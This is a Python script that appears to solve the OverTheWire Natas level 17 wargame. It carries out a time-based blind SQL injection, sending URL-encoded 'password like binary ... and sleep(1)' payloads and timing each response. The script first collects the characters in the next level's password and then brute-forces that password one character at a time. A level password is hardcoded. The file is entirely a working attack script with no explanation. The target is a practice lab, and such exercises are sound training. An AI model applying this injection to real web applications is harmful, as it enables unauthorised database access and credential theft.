#!/bin/python
import requests,string

url = "http://natas17.natas.labs.overthewire.org"
auth_username = "natas17"
auth_password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"

# characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
characters = ''.join([string.ascii_letters,string.digits])

password_dictionary = ['',]
exists_str = "This user exists."

for char in characters:
    uri = ''.join([url,'?',f'username=natas18%22+and+password+like+binary+%27%25{char}%25%27+and+sleep%281%29+%23'])
    print(uri)
    r = requests.get(uri, auth=(auth_username,auth_password))
    elapsed = r.elapsed.total_seconds()
    print(elapsed)
    # print(r.text)
    if elapsed >= 1:
        password_dictionary.append(char)
        print(f"Password Dictionary: {''.join(password_dictionary)}")

print("Dictionary build complete.")
print(f"Dictionary: {''.join(password_dictionary)}")

# Given the dictionary of characters we just built, we'll try each character in that list
print("Now attempting to brute force...")
password_list = ["",]
password = ''

for i in range(1,32):
    for char in password_dictionary:
        test = ''.join([password,char])
        print(test)
        uri = ''.join([url,'?',f'username=natas18%22+and+password+like+binary+%27{test}%25%27+and+sleep%281%29+%23'])
        r = requests.get(uri, auth=(auth_username,auth_password))
        elapsed = r.elapsed.total_seconds()
        if elapsed > 1:
            password_list.append(char)
            password = ''.join(password_list)
            print(f"Length: {len(password)}, Password: {password}")